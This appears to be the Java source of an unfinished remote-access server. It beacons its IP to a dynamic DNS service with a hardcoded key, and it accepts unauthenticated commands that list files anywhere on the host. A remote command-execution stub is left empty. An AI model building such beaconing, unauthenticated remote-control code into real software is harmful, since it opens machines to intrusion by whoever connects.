import java.io.*;
import java.net.*;

public class Main {

    private static boolean connected = false;
    private static boolean internet = false;
    private static boolean posting = true;
    private static boolean running = true;

    private static ServerSocket serverSocket = null;
    private static Socket fromClient = null;
    private static String externalIP;

    private static int[] portList = new int[]{9999,8888,6666,10000};

    private static String domainName = "remoteserver.anondns.net";
    private static String key = "f8ebf7d46abe08f46e9022acd4b96422";

    public static void main(String[] args) throws InterruptedException, IOException {

        while (running) {
            do
            {
                internet = CheckInternetConnection();
                if (!internet) {
                    System.out.print("\tRetrying after 10 seconds...\n");
                    Thread.sleep(10000);
                }
            } while (!internet);

            while (serverSocket == null) {
                CreateServerSocket();
                Thread.sleep(1000);
            }

            Thread IPPostingThread = new Thread(new Runnable() {
                @Override
                public void run() {
                    while (posting) {
                        SendIPToServer();
                        try {
                            Thread.sleep(10000);
                        } catch (InterruptedException e) {
                            System.out.print("Thread sleep error\n");
                        }
                    }
                }
            });
            IPPostingThread.start();

            WaitingForClient();

            while (connected) {
                try {
                    Exchange();
                } catch (IOException e) {
                    connected = false;
                    System.out.print("Client disconnected\n");
                }
                Thread.sleep(500);
            }
        }
    }

    private static boolean CheckInternetConnection() throws IOException {
        try {
            URL url = new URL("http://www.google.com");
            HttpURLConnection con = (HttpURLConnection) url.openConnection();
            con.connect();
            if (con.getResponseCode() == 200){
                System.out.print("Internet connection available\n");
                externalIP = ExternalIPCatcher.GetIP();
                return true;
            }
        } catch (Exception exception) {
            System.out.print("Internet connection not available\n");
            return false;
        }
        System.out.print("Internet connection not available\n");
        return false;
    }

    private static void SendIPToServer() {
        String endUrl = "http://anondns.net/api/set/" + domainName + "/" + key;
        HttpURLConnection connection;
        try {
            URL url = new URL(endUrl);
            connection = (HttpURLConnection)url.openConnection();
            connection.connect();
            int response = connection.getResponseCode();
            if (response == 200)
                System.out.print("\t-IP was sent onto server\n");
            else
                System.out.print("There were some trouble with IP sending");
        } catch (MalformedURLException e) {
            System.out.print("Cannot create URL\n");
        } catch (IOException e) {
            System.out.print("Open connection issue\n");
        }
    }

    static InputStream sin;
    static OutputStream sout;

    private static void Exchange() throws IOException, InterruptedException {
        ObjectOutputStream out = new ObjectOutputStream(sout);
        DataInputStream in = new DataInputStream(sin);

        String line;
        line = in.readUTF();
        System.out.println("Client message: " + line);

        Object object = CheckCommand(line);

        out.writeObject(object); // отсылаем клиенту обратно ту самую строку текста.
        out.flush(); // заставляем поток закончить передачу данных.

        System.out.println("Waiting for the next line...");
    }

    private static Object CheckCommand(String line) {
        String[] command = line.split("\\|");
        String[] args = new String[command.length-1];
        System.arraycopy(command, 1, args, 0, args.length);

        switch (command[0]) {
            case "TEST":
                return "Test done!";
            case "EXIT":
                System.exit(0);
                break;
            case "TREE": //Gets only one string argument (Path)
                return GetFileTree(args);
            case "CMD": //Gets command lines separated by |
                return ExecuteCMD(args);

        }
        return null;
    }

    private static String[] ExecuteCMD(String ... command) {
        //CMD function
        return null;
    }

    private static File[] GetFileTree(String[] args) {
        String path = args[0];
        return Filewalker.walk(path);
    }

    private static boolean WaitingForClient() {
        try {
            System.out.print("Waiting for a client...\n");
            fromClient = serverSocket.accept();
            sin = fromClient.getInputStream();
            sout = fromClient.getOutputStream();
            System.out.print("Client connected\n");
        } catch (IOException e) {
            System.out.print("Can't accept\n");
            return false;
        }
        connected = true;
        return true;
    }

    private static boolean CreateServerSocket() throws InterruptedException {

        boolean availPortExists = false;
        int localPort = 0;
        do {
            for (int i = 0; i < 4; i++) {
                if (CheckPort(portList[i])) {
                    availPortExists = true;
                    localPort = portList[i];
                    break;
                }
                else System.out.print("\tPort " + portList[i] + " not available, switching to another...\n");
            }
            Thread.sleep(1500);
        }while (!availPortExists);

        try {
            serverSocket = new ServerSocket(localPort);
            localPort = serverSocket.getLocalPort();
            System.out.print("Socket started at " + localPort +  " with local address " + serverSocket.getInetAddress().toString() + " and remote " + externalIP + ") \n");
        } catch (IOException e) {
            System.out.print("Cannot bind to port " + localPort + "\n");
            return false;
        }
        return true;
    }

    private static boolean CheckPort(int port) {
        ServerSocket ss = null;
        DatagramSocket ds = null;
        try {
            ss = new ServerSocket(port);
            ss.setReuseAddress(true);
            ds = new DatagramSocket(port);
            ds.setReuseAddress(true);
            return true;
        } catch (IOException ignored) {
        } finally {
            if (ds != null) {
                ds.close();
            }

            if (ss != null) {
                try {
                    ss.close();
                } catch (IOException e) {
                /* should not be thrown */
                }
            }
        }
        return false;
    }
}
